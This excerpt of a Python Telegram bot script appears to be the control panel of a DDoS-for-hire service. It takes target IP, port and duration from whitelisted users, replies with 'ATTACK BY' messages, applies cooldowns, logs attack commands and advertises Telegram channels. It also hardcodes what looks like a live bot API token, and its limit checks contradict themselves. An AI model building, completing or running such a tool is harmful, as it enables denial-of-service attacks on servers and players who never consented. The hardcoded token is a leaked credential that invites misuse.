...
# dm : @Braintree_Auth if you faces any issue
...
bot = telebot.TeleBot('7159493358:AAHOimdke9cTxxwt4qUUmnqjP_3-xjzlrnA')
...
def start_attack_reply(message, target, port, time):
    ...
    response = f"ATTACK BY : {username}\n\nTarget : {target}\nPort : {port}\nTime : {time} Seconds\nSend Feedback\n\n\nJOIN YOUR CHANNEL : @jack_sparrow_offical_0"
    bot.reply_to(message, response)
    ...
    if user_id in allowed_user_ids:
        ...
        if user_id not in admin_id:
            ...
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 0:
                response = "Wait Until Cooldown Finish ❌.\nPlease Wait 0min Before Running Attack"
                bot.reply_to(message, response)
                return
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 500:
                response = " Error: Time interval must be less than 80 Sec."
            else:
                record_command_logs(user_id, '/luis', target, port, time) #cmd change kr lena 😁 [ line : 251 and 256
